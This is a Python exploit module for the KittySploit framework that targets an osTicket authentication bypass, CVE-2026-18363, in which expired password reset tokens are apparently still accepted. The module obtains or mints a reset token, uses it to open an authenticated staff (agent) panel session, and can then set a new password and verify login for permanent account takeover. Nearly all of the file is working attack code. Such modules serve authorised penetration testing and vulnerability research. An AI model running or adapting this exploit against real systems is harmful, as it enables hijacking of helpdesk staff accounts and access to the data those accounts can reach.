#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-18363 — osTicket expired password reset token authentication bypass."""

import re
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "osTicket Reset Token Auth Bypass (CVE-2026-18363)",
        "description": (
            "CVE-2026-18363 in osTicket < 1.17.8 and 1.18.0–1.18.3: password reset tokens are "
            "accepted forever because the expiry gate in PasswordResetTokenBackend::signOn() never "
            "runs for existing tokens. POST the victim's reset token to /scp/pwreset.php to obtain "
            "an authenticated agent session; optionally set a new password for permanent takeover."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-18363"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-18363",
            "https://www.cve.org/CVERecord?id=CVE-2026-18363",
        ],
        "tags": [
            "osticket",
            "auth-bypass",
            "password-reset",
            "account-takeover",
            "cve-2026-18363",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 6,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals", "credentials"],
            "cost": 1.5,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["osticket"],
                "endpoint_pattern_any": ["/scp/pwreset.php"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "stale reset token"},
                    {"capability": "admin_access", "from_detail": "agent SCP session"},
                ],
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(80, "osTicket HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    username = OptString("admin", "Victim agent username or email", False)
    token = OptString("", "48-char password reset token (required unless mail_api flow)", False)
    wait = OptInteger(
        0,
        "Seconds to wait before using the token (prove expiry bypass when > 0)",
        False,
        advanced=True,
    )
    request_reset = OptBool(
        False,
        "Mint a fresh reset token via unauthenticated do=sendmail first",
        False,
    )
    mail_api = OptString(
        "",
        "Mailpit/MailHog base URL to pull the reset token from (e.g. http://host:8025)",
        False,
        advanced=True,
    )
    new_password = OptString("", "Set this password on the victim account after auth", False)
    staff_id = OptInteger(0, "Staff id for password change (0 = auto-detect)", False, advanced=True)

    def _csrf(self, html: str):
        match = re.search(r'__CSRFToken__["\']?\s+value=["\']([^"\']+)["\']', html or "")
        return match.group(1) if match else None

    def _token_from_mail(self):
        base = (self.mail_api or "").rstrip("/")
        if not base:
            return None
        timeout = int(self.timeout or 20)
        for _ in range(20):
            for listing, detail in (
                ("/api/v1/messages", "/api/v1/message/{id}"),
                ("/api/v2/messages", None),
            ):
                try:
                    listing_resp = self.session.get(base + listing, timeout=timeout, verify=False)
                    if listing_resp.status_code != 200:
                        continue
                    data = listing_resp.json()
                except Exception:
                    continue
                items = data.get("messages") or data.get("items") or []
                for item in items:
                    body = ""
                    mid = item.get("ID") or item.get("Id") or item.get("id")
                    if detail and mid:
                        try:
                            detail_resp = self.session.get(
                                base + detail.format(id=mid),
                                timeout=timeout,
                                verify=False,
                            )
                            if detail_resp.status_code == 200:
                                payload = detail_resp.json()
                                body = (payload.get("Text") or "") + (payload.get("HTML") or "")
                        except Exception:
                            body = ""
                    if not body:
                        body = str(item)
                    match = re.search(r"token=([A-Za-z0-9_=]{48})", body)
                    if match:
                        return match.group(1)
            time.sleep(3)
        return None

    def check(self):
        token = (self.token or "").strip()
        if not token and not self.mail_api:
            return {
                "vulnerable": False,
                "reason": "token is required (or use mail_api with request_reset)",
                "confidence": "low",
            }

        base = (self.path or "/").rstrip("/")
        reset_path = f"{base}/scp/pwreset.php" if base else "/scp/pwreset.php"

        if self.request_reset:
            try:
                boot = self.http_request(
                    method="GET",
                    path=reset_path,
                    session=True,
                    allow_redirects=False,
                    timeout=int(self.timeout or 20),
                )
            except Exception as exc:
                return {"vulnerable": False, "reason": str(exc), "confidence": "low"}
            csrf = self._csrf((boot.text or "") if boot else "")
            if not csrf:
                return {"vulnerable": False, "reason": "no CSRF on pwreset form", "confidence": "medium"}
            self.http_request(
                method="POST",
                path=reset_path,
                data={"__CSRFToken__": csrf, "do": "sendmail", "userid": self.username},
                session=True,
                allow_redirects=False,
                timeout=int(self.timeout or 20),
            )
            if not token:
                token = self._token_from_mail() or ""
            if int(self.wait or 0) > 0:
                time.sleep(int(self.wait))

        if not token:
            return {"vulnerable": False, "reason": "no reset token available", "confidence": "medium"}

        boot_path = f"{reset_path}?token={token}"
        try:
            boot = self.http_request(
                method="GET",
                path=boot_path,
                session=True,
                allow_redirects=False,
                timeout=int(self.timeout or 20),
            )
        except Exception as exc:
            return {"vulnerable": False, "reason": str(exc), "confidence": "low"}

        if not boot or boot.status_code != 200:
            return {
                "vulnerable": False,
                "reason": f"pwreset form unavailable (HTTP {getattr(boot, 'status_code', '?')})",
                "confidence": "medium",
            }

        csrf = self._csrf(boot.text or "")
        if not csrf:
            return {"vulnerable": False, "reason": "no CSRF token", "confidence": "medium"}

        try:
            signon = self.http_request(
                method="POST",
                path=reset_path,
                data={
                    "__CSRFToken__": csrf,
                    "do": "newpasswd",
                    "token": token,
                    "userid": self.username,
                },
                session=True,
                allow_redirects=False,
                timeout=int(self.timeout or 20),
            )
        except Exception as exc:
            return {"vulnerable": False, "reason": str(exc), "confidence": "low"}

        if not signon or signon.status_code != 302:
            return {
                "vulnerable": False,
                "reason": f"reset token rejected (HTTP {getattr(signon, 'status_code', '?')})",
                "confidence": "high",
            }
        if "index.php" not in (signon.headers.get("Location") or ""):
            return {
                "vulnerable": False,
                "reason": "no redirect to index.php — patched or token/user mismatch",
                "confidence": "high",
            }

        index_path = f"{base}/scp/index.php" if base else "/scp/index.php"
        panel = self.http_request(
            method="GET",
            path=index_path,
            session=True,
            allow_redirects=True,
            timeout=int(self.timeout or 20),
        )
        body = (panel.text or "") if panel else ""
        markers = ("logout.php", "Agent Panel", "profile.php", "dashboard.php")
        if not any(marker in body for marker in markers) or "pwreset.php" in body[:800]:
            return {
                "vulnerable": False,
                "reason": "302 received but SCP page is not authenticated",
                "confidence": "high",
            }

        return {
            "vulnerable": True,
            "reason": f"Authenticated as agent '{self.username}' with reset token",
            "confidence": "high",
            "token": token,
            "panel_body": body,
            "csrf": self._csrf(body) or csrf,
        }

    def run(self):
        try:
            print_status("CVE-2026-18363 — osTicket reset token auth bypass")

            if int(self.wait or 0) > 0 and not self.request_reset:
                print_status(f"Waiting {int(self.wait)}s before using the token")
                time.sleep(int(self.wait))

            result = self.check()
            if not result.get("vulnerable"):
                print_error(result.get("reason", "Target does not appear vulnerable"))
                return False

            print_success(result.get("reason", "Target appears vulnerable"))
            body = result.get("panel_body") or ""
            who = re.search(r"<strong[^>]*>\s*([^<]{2,60})</strong>", body)
            if who:
                print_info(f"Logged in as: {who.group(1).strip()}")

            new_password = (self.new_password or "").strip()
            if not new_password:
                print_info("Set new_password to seize the account permanently")
                return True

            staff_id = int(self.staff_id or 0)
            if not staff_id:
                match = re.search(r"staff/(\d+)/change-password", body)
                staff_id = int(match.group(1)) if match else 0
            if not staff_id:
                print_warning("Could not determine staff id — pass staff_id manually")
                return True

            base = (self.path or "/").rstrip("/")
            csrf = result.get("csrf") or self._csrf(body)
            change_path = f"{base}/scp/ajax.php/staff/{staff_id}/change-password" if base else f"/scp/ajax.php/staff/{staff_id}/change-password"
            change = self.http_request(
                method="POST",
                path=change_path,
                data={
                    "__CSRFToken__": csrf,
                    "passwd1": new_password,
                    "passwd2": new_password,
                },
                headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": f"{base}/scp/index.php" if base else "/scp/index.php",
                },
                session=True,
                allow_redirects=False,
                timeout=int(self.timeout or 20),
            )
            if change and change.status_code in (200, 201):
                print_success(f"Password changed for staff id {staff_id}")
            else:
                code = getattr(change, "status_code", "?")
                print_warning(f"Password change returned HTTP {code}")

            login_path = f"{base}/scp/login.php" if base else "/scp/login.php"
            login_get = self.http_request(
                method="GET",
                path=login_path,
                session=True,
                allow_redirects=False,
                timeout=int(self.timeout or 20),
            )
            login_csrf = self._csrf((login_get.text or "") if login_get else "")
            if login_csrf:
                verify = self.http_request(
                    method="POST",
                    path=login_path,
                    data={
                        "__CSRFToken__": login_csrf,
                        "do": "scplogin",
                        "userid": self.username,
                        "passwd": new_password,
                    },
                    session=True,
                    allow_redirects=False,
                    timeout=int(self.timeout or 20),
                )
                loc = (verify.headers.get("Location") or "") if verify else ""
                if verify and verify.status_code == 302 and "login.php" not in loc:
                    print_success(
                        f"Independent login confirmed — {self.username}:{new_password}"
                    )
                else:
                    print_warning("New password did not authenticate independently")

            return True

        except Exception as exc:
            print_error(f"Module failed: {exc}")
            return False
